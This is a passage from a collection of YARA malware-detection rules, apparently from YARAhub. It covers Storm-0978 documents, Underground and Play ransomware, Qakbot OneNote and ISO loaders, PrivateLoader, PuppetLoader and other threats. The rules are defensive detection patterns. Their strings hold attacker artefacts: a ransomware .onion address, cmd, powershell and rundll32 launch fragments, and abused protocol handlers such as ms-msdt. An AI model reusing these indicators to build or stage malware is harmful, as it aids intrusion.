		uint32be(0x0) == 0xE4525C7B
		and 3 of them
}rule MALWARE_Storm0978_HTML_PROTHANDLER_Jul23
{
    meta:
        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
        description = "Detects Office HTML injection through docfiles with Windows Protocol Handler execution"
        reference = "https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit"
        date = "2023-07-11"
        tlp = "CLEAR"
        hash = "07377209fe68a98e9bca310d9749daa4eb79558e9fc419cf0b02a9e37679038d"
        yarahub_uuid = "85dbba47-f82d-478f-b941-88ac44f62a2b"
        yarahub_reference_md5 = "26a6a0c852677a193994e4a3ccc8c2eb"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"

    strings:
        $doc_magic = {D0 CF 11 E0 A1 B1 1A E1}

        $s_htmlTag = "<html>" nocase ascii wide
        $s_location = "location.href" nocase ascii wide
        $s_iframe = "document.write('<iframe" nocase ascii wide
        $s_mhtml = "src=\"mhtml:ms-" nocase ascii wide
        $s_temp = "/appdata/local/temp" nocase ascii wide
        $s_script = "<script defer>" nocase ascii wide

        // Some of the most popular ones; 
        // Source: https://github.com/splunk/security_content/blob/develop/lookups/windows_protocol_handlers.csv
        $prothandler_msdt = "ms-msdt" ascii wide
        $prothandler_search = "search-ms" ascii wide
        $prothandler_msits = "ms-its" ascii wide
        $prothandler_word = "ms-word" ascii wide
        $prothandler_excel = "ms-excel" ascii wide
        $prothandler_powerp = "ms-powerpoint" ascii wide

    condition:
        $doc_magic at 0x0
        and $doc_magic
        and 4 of ($s_*)
        and 1 of ($prothandler_*)
}
rule MALWARE_Storm0978_Underground_Ransomware_Jul23
{
    meta:
        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
        description = "Hunting rule for samples of 'Underground Ransomware', linked to IndustrialSpy and Storm-0978"
        reference = "https://twitter.com/RakeshKrish12/status/1678296344061157377"
        date = "2023-07-12"
        tlp = "CLEAR"
        hash = "d4a847fa9c4c7130a852a2e197b205493170a8b44426d9ec481fc4b285a92666"
        yarahub_uuid = "4ed613b6-9ed6-424c-a3b1-79855eebc0fa"
        yarahub_reference_md5 = "059175be5681a633190cd9631e2975f6"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"

    strings:
        $s_1 = "temp.cmd" wide
        $s_2 = "%s\\!!readme!!!.txt" wide
        $s_3 = "VIPinfo.txt" wide
        $s_4 = "The Underground team welcomes you!" ascii
        $s_5 = "http://undgrddapc4reaunnrdrmnagvdelqfvmgycuvilgwb5uxm25sxawaoqd.onion"
        $s_6 = "File unlocking error" wide

    condition:
        uint16(0) == 0x5a4d
        and 4 of ($s_*)
}
rule Matanbuchus_MSI_2 : matanbuchus msitwo
{
    meta:
        author                    = "Andre Gironda"
        date                      = "2022-06-16"
        description               = "Matanbuchus MSI contains CAB with DLL via Zip via HTML Smuggling via Zip as malspam attachment / TA570 who normally delivers Qakbot"
        hash                      = "5dcbffef867b44bbb828cfb4a21c9fb1fa3404b4d8b6f4e8118c62addbf859da"
        hash2                     = "4d5da2273e2d7cce6ac37027afd286af"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_twitter    = "@AndreGironda"
        yarahub_license           = "CC0 1.0"
        yarahub_reference_md5     = "4d5da2273e2d7cce6ac37027afd286af"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "f29897f3-a6f1-43d7-b1cf-553671dc3c75"
   strings:
        $hex_36855 = { 50 72 69 76 61 74 65 20 4f 72 67 61 6e 69 7a 61 74 69 6f 6e 31 }
        $hex_368bd = { 57 65 73 74 65 61 73 74 20 54 65 63 68 20 43 6f 6e 73 75 6c 74 69 6e 67 2c 20 43 6f 72 70 2e 31 }
    condition:
        all of them
}
rule meth_get_eip {
  meta:
    date = "2022-06-13"
    author = "Willi Ballenthin"
    yarahub_author_email = "william.ballenthin@mandiant.com"
    yarahub_author_twitter = "@williballenthin"
    yarahub_uuid = "666bfd55-7931-454e-beb8-22b5211ab04f"
    yarahub_license = "CC BY 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "9727d5c2a5133f3b6a6466cc530a5048"
    strings:
       // 0:  e8 00 00 00 00          call   5 <_main+0x5>
       // 5:  58                      pop    eax
       // 6:  5b                      pop    ebx
       // 7:  59                      pop    ecx
       // 8:  5a                      pop    edx
       // 9:  5e                      pop    esi
       // a:  5f                      pop    edi
       $x86 = { e8 00 00 00 00 (58 | 5b | 59 | 5a | 5e | 5f) }

    condition:
       $x86
}rule meth_peb_parsing {
  meta:
    date = "2022-06-13"
    author = "Willi Ballenthin"
    yarahub_author_email = "william.ballenthin@mandiant.com"
    yarahub_author_twitter = "@williballenthin"
    yarahub_uuid = "fc096806-e637-43ac-b969-ec6a1f37328a"
    yarahub_license = "CC BY 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "00000000000000000000000000000000"
    strings:
       //                                                         ;; TEB->PEB
       // (64 a1 30 00 00 00 |                                    ; mov eax, fs:30
       //  64 8b (1d | 0d | 15 | 35 | 3d) 30 00 00 00 |           ; mov $reg, DWORD PTR fs:0x30
       //  31 (c0 | db | c9 | d2 | f6 | ff) [0-8] 64 8b ?? 30 )   ; xor $reg; mov $reg, DWORD PTR fs:[$reg+0x30]
       // [0-8]                                                   ; up to 8 bytes of interspersed instructions
       //                                                         ;; PEB->LDR_DATA
       // 8b ?? 0c                                                ; mov eax,DWORD PTR [eax+0xc]
       // [0-8]                                                   ; up to 8 bytes of interspersed instructions
       //                                                         ;; LDR_DATA->OrderLinks
       // 8b ?? (0c | 14 | 1C)                                    ; mov edx, [edx+0Ch]
       // [0-8]                                                   ; up to 8 bytes of interspersed instructions
       //                                                         ;; _LDR_DATA_TABLE_ENTRY.DllName.Buffer
       // 8b ?? (28 | 30)                                         ; mov esi, [edx+28h]
       $peb_parsing = { (64 a1 30 00 00 00 | 64 8b (1d | 0d | 15 | 35 | 3d) 30 00 00 00 | 31 (c0 | db | c9 | d2 | f6 | ff) [0-8] 64 8b ?? 30 ) [0-8] 8b ?? 0c [0-8] 8b ?? (0c | 14 | 1C) [0-8] 8b ?? (28 | 30) }

       $peb_parsing64 = { (48 65 A1 60 00 00 00 00 00 00 00 | 65 (48 | 4C) 8B ?? 60 00 00 00 | 65 A1 60 00 00 00 00 00 00 00 | 65 8b ?? ?? 00 FF FF | (48 31 (c0 | db | c9 | d2 | f6 | ff) | 4D 31 (c0 | c9))  [0-16] 65 (48 | 4d | 49 | 4c) 8b ?? 60) [0-16] (48 | 49 | 4C) 8B ?? 18 [0-16] (48 | 49 | 4C) 8B ?? (10 | 20 | 30) [0-16] (48 | 49 | 4C) 8B ?? (50 | 60) }

    condition:
       $peb_parsing or $peb_parsing64
}rule meth_stackstrings {
  meta:
    date = "2022-06-13"
    author = "Willi Ballenthin"
    yarahub_author_email = "william.ballenthin@mandiant.com"
    yarahub_author_twitter = "@williballenthin"
    yarahub_uuid = "71fe67dc-8cb3-4b1f-8eb8-7b2e0933e0b4"
    yarahub_license = "CC BY 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "00000000000000000000000000000000"
    strings:
        // stack string near the frame pointer.
        // the compiler may choose to use a single byte offset from $bp.
        // like: mov [ebp-10h], 25h
        //
        // regex explanation:
        //   4 times:
        //     byte C6          (mov byte)
        //     byte 45          ($bp-relative, one-byte offset)
        //     any byte         (the offset from $bp)
        //     printable ascii  (the immediate constant)
        //   1 times:
        //     byte C6          (mov byte)
        //     byte 45          ($bp-relative, one-byte offset)
        //     any byte         (the offset from $bp)
        //     byte 00          (the immediate constant, null terminator)
        $ss_small_bp = /(\xC6\x45.[a-zA-Z0-9 -~]){4,}\xC6\x45.\x00/

        // dword stack string near the frame pointer.
        // the compiler may choose to use a single byte offset from $bp.
        // it may move four bytes at a time onto the stack.
        // like: mov [ebp-10h], 680073h  ; "sh"
        //
        // regex explanation:
        //   2 times:
        //     byte C7          (mov dword)
        //     byte 45          ($bp-relative, one-byte offset)
        //     any byte         (the offset from $bp)
        //     printable ascii  (the immediate constant)
        //     byte 00          (second byte of utf-16 encoding of ascii character)
        //     printable ascii  (the immediate constant)
        //     byte 00          (second byte of utf-16 encoding of ascii character)
        //   1 times:
        //     byte C7          (mov dword)
        //     byte 45          ($bp-relative, one-byte offset)
        //     any byte         (the offset from $bp)
        //     any byte         (immediate constant or NULL terminator)
        //     byte 00          (the immediate constant, NULL terminator)
        //     byte 00          (the immediate constant, NULL terminator)
        //     byte 00          (the immediate constant, NULL terminator)
        $ss_small_bp_dword = /(\xC7\x45.[a-zA-Z0-9 -~]\x00[a-zA-Z0-9 -~]\x00){2,}\xC7\x45..\x00\x00\x00/

        // stack strings further away from the frame pointer.
        // the compiler may choose to use a four-byte offset from $bp.
        // like: mov byte ptr [ebp-D80h], 5Ch
        // we restrict the offset to be within 0xFFF (4095) of the frame pointer.
        //
        // regex explanation:
        //   4 times:
        //     byte C6          (mov byte)
        //     byte 85          ($bp-relative, four-byte offset)
        //     any byte         (LSB of the offset from $bp)
        //     byte 0xF0-0xFF   (second LSB of the offset from $bp)
        //     byte FF          (second MSB)
        //     byte FF          (MSB of the offset from $bp)
        //     printable ascii  (the immediate constant)
        //   1 times:
        //     byte C6          (mov byte)
        //     byte 85          ($bp-relative, four-byte offset)
        //     any byte         (LSB of the offset from $bp)
        //     byte 0xF0-0xFF   (second LSB of the offset from $bp)
        //     byte FF          (second MSB)
        //     byte FF          (MSB of the offset from $bp)
        //     byte 00          (the immediate constant, null terminator)
        $ss_big_bp = /(\xC6\x85.[\xF0-\xFF]\xFF\xFF[a-zA-Z0-9 -~]){4,}\xC6\x85.[\xF0-\xFF]\xFF\xFF\x00/

        // stack string near the stack pointer.
        // the compiler may choose to use a single byte offset from $sp.
        // like: mov byte ptr [esp+0Bh], 24h
        //
        // regex explanation:
        //   4 times:
        //     byte C6          (mov byte)
        //     byte 44          ($sp-relative, one-byte offset)
        //     byte 24          ($sp-relative, one-byte offset)
        //     any byte         (the offset from $sp)
        //     printable ascii  (the immediate constant)
        //   1 times:
        //     byte C6          (mov byte)
        //     byte 44          ($sp-relative, one-byte offset)
        //     byte 24          ($sp-relative, one-byte offset)
        //     any byte         (the offset from $sp)
        //     byte 00          (the immediate constant, null terminator)
        $ss_small_sp = /(\xC6\x44\x24.[a-zA-Z0-9 -~]){4,}\xC6\x44\x24.\x00/

        // stack strings further away from the stack pointer.
        // the compiler may choose to use a four-byte offset from $sp.
        // like: byte ptr [esp+0DDh], 49h
        // we restrict the offset to be within 0xFFF (4095) of the stack pointer.
        //
        // regex explanation:
        //   4 times:
        //     byte C6          (mov byte)
        //     byte 84          ($sp-relative, four-byte offset)
        //     byte 24          ($sp-relative, four-byte offset)
        //     any byte         (LSB of the offset from $sp)
        //     byte 0x00-0x0F   (second LSB of the offset from $sp)
        //     byte 00          (second MSB)
        //     byte 00          (MSB of the offset from $sp)
        //     printable ascii  (the immediate constant)
        //   1 times:
        //     byte C6          (mov byte)
        //     byte 84          ($sp-relative, four-byte offset)
        //     byte 24          ($sp-relative, four-byte offset)
        //     any byte         (LSB of the offset from $sp)
        //     byte 0x00-0x0F   (second LSB of the offset from $sp)
        //     byte 00          (second MSB)
        //     byte 00          (MSB of the offset from $sp)
        //     byte 00          (the immediate constant, null terminator)
        $ss_big_sp = /(\xC6\x84\x24.[\x00-\x0F]\x00\x00[a-zA-Z0-9 -~]){4,}\xC6\x84\x24.[\x00-\x0F]\x00\x00\x00/

    condition:
        $ss_small_bp or $ss_small_bp_dword or $ss_big_bp or $ss_small_sp or $ss_big_sp
}rule Nymaim
{
	meta:
		author = "Chaitanya"
		description = "Nymaim Loader"
		date = "2023-01-27"
		yarahub_reference_md5 = "0e56ecfe46a100ed5be6a7ea5a43432c"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		malpedia_family = "win.nymaim"
		yarahub_uuid = "5c578ac7-23cd-44d3-8bf9-e5c6db8cc13d"
    strings:
  $a = {80 79 ?? 00 74 ?? 0f 10 01 b8 10 00 00 00 0f 28 0d ?? ?? ?? ?? 66 0f ef c8 0f 11 09 0f 1f 40 00 80 34 08 2e 40 83 f8 ?? 72 ??}    
  $b = {80 79 0b 00 74 ?? 33 c0 80 34 08 2e 40 83 f8 0c 72 ??}
  $c = {80 79 0e 00 74 ?? 33 c0 80 34 08 2e 40 83 f8 0f 72 ??}
  condition:
		uint16(0) == 0x5A4D and all of them
	}rule OneNote_EmbeddedFiles_NoPictures
{
    meta:
        author = "Nicholas Dhaeyer - @DhaeyerWolf"
        date_created = "2023-02-14 - <3"
        date_last_modified = "2023-02-17"
        description = "OneNote files that contain embedded files that are not pictures."
        reference = "https://blog.didierstevens.com/2023/01/22/analyzing-malicious-onenote-documents/"
		yarahub_uuid = "d0c4f0e6-adbe-4953-a2df-91427a561e97"
		date = "2023-02-14"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "52486a446dd4fc5842a47b57d3febec7"

    strings:
        $EmbeddedFileGUID =  { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC }
        $PNG = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 89 50 4E 47 0D 0A 1A 0A }
        $JPG = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 FF D8 FF }
        $JPG20001 = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0C 6A 50 20 20 0D 0A 87 0A }
        $JPG20002 = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 FF 4F FF 51 }
        $BMP = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 42 4D }
        $GIF = { E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 47 49 46 }

    condition:
        $EmbeddedFileGUID and (#EmbeddedFileGUID > #PNG + #JPG + #JPG20001 + #JPG20002 + #BMP + #GIF)
}
rule PaaS_SpearPhishing_Feb23
{

    meta:
	author = "Alexander Hatala (@AlexanderHatala)"
	description = "Detects targeted spear phishing campaigns using a private PaaS based on filenames."
	date = "2023-02-11"
	tlp = "CLEAR"
	yarahub_reference_md5 = "084b4397d2c3590155fed50f0ad9afcf"
	yarahub_uuid = "2c4733fc-3ec7-45db-adae-1a396ba8d4ae"
	yarahub_license = "CC BY 4.0"
	yarahub_rule_matching_tlp = "TLP:WHITE"
	yarahub_rule_sharing_tlp = "TLP:WHITE"
	yarahub_author_twitter = "@AlexanderHatala"

    strings:
        $file1 = "saved_resource.html"
        $file2 = "/antibots7/"
        $file3 = "infos.php"
        $file4 = "config00.php"
        $file5 = "config0.php"
        $file6 = "personal.php"
        $file7 = "Email.php"
        
    condition:
        all of them
}
rule PassProtected_ZIP_ISO_file {
   meta:
      description = "Detects container formats commonly smuggled through password-protected zips"
      author = "_jc"
      date = "2022-09-29"
      yarahub_reference_md5 = "b93bd94b8f568deac0143bf93f7d8bd8"
      yarahub_uuid = "0b027752-0217-48f9-9515-3760872cc210"
      yarahub_license = "CC BY 4.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
   strings:
      $password_protected_zip = { 50 4B 03 04 14 00 01 }

      $container_1 = ".iso" ascii
      $container_2 = ".rr0" ascii
      $container_3 = ".img" ascii
      $container_4 = ".vhd" ascii
      $container_5 = ".rar" ascii

   condition:
      uint32(0) == 0x04034B50 and
      filesize < 2000KB and 
      $password_protected_zip and 
      1 of ($container*)
}import "pe"

rule pe_no_import_table {
    meta:
        description = "Detect pe file that no import table"
        date = "2021-10-19"
        yarahub_uuid = "a91fb4f4-1ceb-456d-90d1-a25f6d16b204"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "045ff7ed5a360b19dcc4c5bd9211d194"
    condition:
        pe.is_pe
        and pe.number_of_imports == 0
}rule Play_Ransomware
{
    meta:
		description = "Detects Play Ransomware"
		author = "Mickaël Walter (I-Tracing)"
		date = "2022-07-04"
        yarahub_reference_md5 = "0ba1d5a26f15f5f7942d0435fa63947e"
        yarahub_uuid = "3dad72db-1b26-42e9-93aa-403b132d956b"
        yarahub_license = "CC BY-SA 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

	strings:
		$a1 = "OpaqueKeyBlob" wide
		$b1 = { 83 c1 01 ba 01 00 00 00 d3 e2 f7 d2 8b 45 18 03 45 fc 0f be 08 23 ca 8b 55 18 03 55 fc 88 0a } // Extract of deobfuscation code
		$b2 = { 8b 4d f4 83 c1 01 ba 01 00 00 00 d3 e2 f7 d2 8b 45 f8 03 45 fc 0f be 08 23 ca 8b 55 f8 03 55 fc 88 0a } // Another extract

    condition:
        uint16(0) == 0x5a4d and 2 of ($a1, $b1, $b2) and filesize < 200KB
}rule privateloader : loader 
{
  meta:
    author =                    "andretavare5"
    org =                       "BitSight"
    date =                      "2022-06-06"
    description =               "PrivateLoader pay-per-install malware"
    yarahub_author_twitter =    "@andretavare5"
    yarahub_reference_link =    "https://tavares.re/blog/2022/06/06/hunting-privateloader-pay-per-install-service"
    yarahub_malpedia_family =   "win.privateloader"
    yarahub_uuid =              "5916c441-16b1-42b7-acaa-114c06296f38"
    yarahub_license =           "CC BY-NC-SA 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp =  "TLP:WHITE"
    yarahub_reference_md5 =     "8f70a0f45532261cb4df2800b141551d"
    
  strings:
    $code = {66 0F EF (4?|8?)} // pxor xmm(1/0) - str chunk decryption
    $str = "Content-Type: application/x-www-form-urlencoded\r\n" wide ascii
   	$ua1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" wide ascii
    $ua2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36" wide ascii
                              
  condition:
    uint16(0) == 0x5A4D and // MZ
    $str and
    any of ($ua*) and
    #code > 100
}rule PseudoManuscriptLoader{
  meta:
    author="@luc4m"
    date="2023-03-26"
    hash="e299ac0fd27e67160225400bdd27366f"
    tlp="CLEAR"
    yarahub_uuid = "b5613b13-99a6-4aa7-95a2-44ca02429965"
    yarahub_license =  "CC0 1.0"
    yarahub_rule_matching_tlp =  "TLP:WHITE"
    yarahub_rule_sharing_tlp =  "TLP:WHITE"
    yarahub_reference_md5= "53f9c2f2f1a755fc04130fd5e9fcaff4" 

  strings:
          $trait_0 = {57 8b ce 8b d8 e8 7b ff ff ff 8b 0b 89 08 33 ed 45 8b c5 5d 5b 5f 5e c2 04 00}
        $trait_1 = {57 8b ce 8b d8 e8 7b ff ff ff 8b 0b 89 08 33 ed 45 8b c5 5d 5b 5f 5e c2 04 00}
        $trait_2 = {ff 15 ?? ?? ?? ?? 85 c0 75 05 e8 6c f1 ff ff c2 04 00}
        $trait_3 = {ff 74 b5 ?? 8b 4d ?? e8 e7 fa ff ff 3b c7 59 75 07}
        $trait_4 = {b7 c0 0b c3 50 ff d6 53 89 45 ?? ff d6 89 45 ?? c7 45 ?? ?? ?? ?? ?? e9 9b fe ff ff}
        $trait_5 = {ff 74 b5 ?? 8b 4d ?? e8 e7 fa ff ff 3b c7 59 75 07}
        $trait_6 = {45 fc 56 8b c1 be 04 01 00 00 56 8d 8d ?? ?? ?? ?? 51 ff 70 ?? ff 15 ?? ?? ?? ?? 85 c0 74 56}
        $trait_7 = {8d 75 ?? 56 2b d1 52 50 e8 bd f9 ff ff 83 c4 0c 8d 85 ?? ?? ?? ?? 50 e8 97 fc ff ff eb 02}
        $trait_8 = {8d 45 ?? 50 8d 4d ?? 89 7d ?? e8 51 f5 ff ff 84 c0 74 08}
        $trait_9 = {ff 74 b5 ?? 8b 4d ?? e8 e7 fa ff ff 3b c7 59 75 07}


     $u1 = "https://%s.com/%d.html"

  condition:
     (uint16(0) == 0x5A4D) and filesize < 5MB and (1 of ($u*) and 5 of ($trait_*))


}
rule PUPPETLOADER_loader {
  meta:
    date = "2022-06-13"
    author = "Willi Ballenthin"
    yarahub_author_email = "william.ballenthin@mandiant.com"
    yarahub_author_twitter = "@williballenthin"
    yarahub_uuid = "87d14a7a-047f-4db2-83a9-1b0bd5097e1e"
    yarahub_license = "CC BY 4.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "7fdeb5fb041463416620cf9f446532e4"
  strings:
        $a1 = "PuppetLoader.Puppet.Core.x64.Release" ascii wide
        $a2 = "PuppetLoader.Puppet.Core" ascii wide
        $a3 = "HijacjBmpPath" ascii wide
        $a4 = "dwOriginBmpFileSize" ascii wide
        $a5 = "TsClientReceptor_Core" ascii wide
        $a6 = "PuppetLoader_Puppet_Core" ascii wide
        $a7 = "TsClientReceptor.Install" ascii wide
        $a8 = "l UnExist [" ascii wide
        $a9 = "] Faild! Error" ascii wide
        $a10 = "GUID_Common_FileShareMemoryName" ascii wide
        $a11 = "GUID_Common_ShareMemoryName" ascii wide
        $a12 = "GUID_CrackWinPassword_x64_Release" ascii wide
        $a13 = "GUID_KeepAuthority_Launcher_Core_x64_Release" ascii wide
        $a14 = "GUID_KeepAuthority_MainConsole_x64_Release" ascii wide
        $a15 = "GUID_KeepAuthority_Service_Hijacker" ascii wide
        $a16 = "GUID_PuppetLoader_Puppet_Core_x64_Release" ascii wide
        $a17 = "GUID_PuppetLoader_Puppet_Shell_x64_Release" ascii wide
        $a18 = "GUID_TsClientReceptor_Core_PreventRepeatRunning_MutexName" ascii wide
        $a19 = "GUID_TsClientReceptor_Core_x64_Release" ascii wide
        $a20 = "Mutex_KeepAuthority_Launcher_Core_x64_Release" ascii wide
        $a21 = "[+] SendParam to [Explorer.exe] for Load TsClientReceptor" ascii wide
        $a22 = "[+] TsClientReceptor.Install.Injector [Explorer.exe]" ascii wide
        $a23 = "[-] Injector to [Explorer.exe] Faild! Error" ascii wide
        $a24 = "[-] Puppet.Shell UnExist [Puppet.Core.x64.Release]" ascii wide
        $g1 = "{0137C4B3-9511-54A1-DAFA-EF5916E42AE7}" ascii wide
        $g2 = "{07243368-21B1-22F0-9757-49A405B4DDF1}" ascii wide
        $g3 = "{09884BAB-D4AD-1969-8807-A4AE797A8C31}" ascii wide
        $g4 = "{0D287554-3E48-C081-1EEE-6E73FA4749E1}" ascii wide
        $g5 = "{0DDC8939-E627-3895-4CDA-A703C54AF86F}" ascii wide
        $g6 = "{0E0E5273-C9DC-03FB-7830-014DD7143F48}" ascii wide
        $g7 = "{27737527-D71F-1A85-081D-080A2F6A10E1}" ascii wide
        $g8 = "{2D606381-46DB-0AFC-325B-9687FB5E86CB}" ascii wide
        $g9 = "{36BF388E-8509-E892-430C-D0ABC3038CE6}" ascii wide
        $g10 = "{3A8163C4-1D40-DFD0-AB78-BEF1C8423439}" ascii wide
        $g11 = "{409A21C9-45D9-A0C9-5564-E3647EC26CB0}" ascii wide
        $g12 = "{46B0888B-0941-52E6-6FBA-80F04E425935}" ascii wide
        $g13 = "{4AF0C1F6-714E-A36C-428D-851DC708EF2B}" ascii wide
        $g14 = "{4F97AB75-B463-0399-D30E-FC22B4596D64}" ascii wide
        $g15 = "{54A4A30A-C06A-3EE6-C36D-0F84820221CA}" ascii wide
        $g16 = "{6ED6C950-9133-A1C5-A010-EC27B06C80B6}" ascii wide
        $g17 = "{73303282-8959-6FA7-2DBE-E4126D8B6634}" ascii wide
        $g18 = "{78106D5F-CD1A-A8C4-A625-6863092B4BBA}" ascii wide
        $g19 = "{7D8DA9DC-1F3B-2E5C-AA59-9418E652E4AA}" ascii wide
        $g20 = "{8341B127-B109-66A3-9F23-E9C52D6309BE}" ascii wide
        $g21 = "{94262E6D-AC4C-89C5-C380-668F0CBA9F4C}" ascii wide
        $g22 = "{A20827CB-C06C-967E-00AD-C6BDC9B3C8B8}" ascii wide
        $g23 = "{A31EACD0-359E-2FDD-D0DF-C253F2BCE623}" ascii wide
        $g24 = "{ADB3515D-426D-B1BB-6EA4-DCD760485C82}" ascii wide
        $g25 = "{AFE10005-B7DF-352C-1F79-FAEE9EF6BB5C}" ascii wide
        $g26 = "{B27FAFB3-62A8-DE16-360A-2F5FEE4F5B97}" ascii wide
        $g27 = "{B573FEAA-9F11-9459-5A70-25687347EEF6}" ascii wide
        $g28 = "{B5A7BDC2-0FAC-3EE8-B382-7A32599C3C0F}" ascii wide
        $g29 = "{B97CBA44-A361-1602-2934-7D08A4E1F49F}" ascii wide
        $g30 = "{CE2A883F-04FA-B568-6788-F3D29780989D}" ascii wide
        $g31 = "{D11BE42E-763C-5134-93AA-1F618C8F3C56}" ascii wide
        $g32 = "{D47CBD52-96C3-1B68-2C88-84D495F8C7A1}" ascii wide
        $g33 = "{E9F0F295-7A48-C9ED-6696-3B4D2BBEC787}" ascii wide
        $g34 = "{EA205CF8-4CC4-4FBB-E430-AF497368CF46}" ascii wide
        $g35 = "{F032FD6E-C8EE-EDFC-0ECD-41C2BA46965B}" ascii wide
        $g36 = "{F198C4FF-5133-EFEA-C6FC-330B9AF9E208}" ascii wide
    condition:
        any of ($a*) or 5 of ($g*)
}rule Qakbot_IsoCampaign{
meta:
author = "Malhuters"
description = "Qakbot New Campaign ISO"
date = "2022-10-06"
yarahub_reference_md5 = "456373BC4955E0B6750E8791AB84F004"
yarahub_uuid = "cef91a6a-f270-4c35-87a4-98b6f78096db"
yarahub_license = "CC0 1.0"
yarahub_rule_matching_tlp = "TLP:WHITE"
yarahub_rule_sharing_tlp = "TLP:WHITE"
malpedia_family = "win.qakbot"
strings:
$str1 = "CD001"
$str2 = "This disc contains Unicode file names and requires an operating system"
$str3 = "such as Microsoft Windows 95 or Microsoft Windows NT 4.0."
$str4 = "README.TXT"
$str5 = "Windows"
$str6 = "C:\\Windows\\System32\\cmd.exe"
$str7 = "%SystemRoot%\\System32\\shell32.dll"
$str8 = "desktop-"
$str9 = ">CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), default quality"
condition:
(5 of ($str*)) 
}rule QakBot_OneNote_Loader {

  meta:
      author = "Ankit Anubhav - ankitanubhav.info"
      description = "Detects a OneNote malicious loader mostly used by QBot (TA570/TA577)"
      date = "2023-02-04"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
      yarahub_reference_md5 = "b6c8d82a4ec67398c756fc1f36e32511"
      yarahub_uuid = "cbbe7ec6-1658-4f4b-b229-8ade27bff9f4"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "win.qakbot"

strings:

  $x = { E4 52 5C 7B 8C D8 A7 4D AE B1 53 78 D0 29 96 D3 } // OneNote header

// Variant 1
// Looking for evidence of onenote containing vbs/js/ and code to write data in registry and execute it.
// Some of these might be obfuscated so looking for a 3/5 match.
  $a = "javascript" nocase
  $b = "vbscript" nocase
  $c = "regread" nocase
  $d = "regwrite" nocase
  $e = "RegDelete" nocase

// Variant 2
// Instead of hta abuses batch and powershell to download and run the DLL

  $f = ".cmd&&start /min" nocase //edit 07.02.22 for batch file vector
  $f2 = "&&cmd /c start /min" nocase // edit 14.02.22 run command and then exit
  $g = "powershell" nocase

// Variant 3
// Involves powershell as well but obfuscation is different.
// The string powershell can not be found because it is partially hidden by environment variables.

  $tok1 = "rundll32 C:\\ProgramData\\" nocase // tok1 botnet ID

// Some cases they are obfuscating a lot by breaking all in set

$h = "set" // Look for several of these
$i = "start /min"



condition:
	$x and ((3 of ($a,$b,$c,$d,$e)) or (($f or $f2) and $g) or $tok1 or (#h > 15 and $i))


}
rule Qakbot_WSF_loader {

  meta:
      author = "Ankit Anubhav -ankitanubhav.info"
      description = "Detects a WSF loader used to deploy Qakbot DLL"
      date = "2023-02-15"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
